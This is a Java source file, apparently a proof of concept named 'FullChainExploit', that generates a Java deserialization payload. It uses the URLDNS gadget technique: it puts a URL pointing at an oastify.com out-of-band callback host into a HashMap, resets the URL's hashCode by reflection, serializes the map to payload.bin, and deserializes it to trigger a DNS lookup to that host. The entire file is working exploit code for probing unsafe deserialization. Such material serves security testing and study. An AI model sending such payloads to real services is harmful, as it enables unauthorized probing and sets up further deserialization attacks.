package org.example;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;

public class FullChainExploit {
    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        URLStreamHandler urlStreamHandler = new URLStreamHandler() {
            @Override
            protected URLConnection openConnection(URL u) throws IOException {
                return null;
            }
        };
        URL url = new URL(null, "https://b0cp17t9b5ujp5pjym4jiyrex53wrsfh.oastify.com", urlStreamHandler);
        HashMap map = new HashMap();
        Field field = Class.forName("java.net.URL").getDeclaredField("hashCode");
        field.setAccessible(true);
        map.put(url, "https://b0cp17t9b5ujp5pjym4jiyrex53wrsfh.oastify.com");
        field.set(url, -1);

        saveObject(map);
        readObject(new File("payload.bin"));
    }

    public static void saveObject(Object obj) {
        try {
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("payload.bin"));
            oos.writeObject(obj);
            oos.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void readObject(File file) {
        try {
            FileInputStream fis = new FileInputStream(file);
            ObjectInputStream ois = new ObjectInputStream(fis);
            ois.readObject();
            ois.close();
            fis.close();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
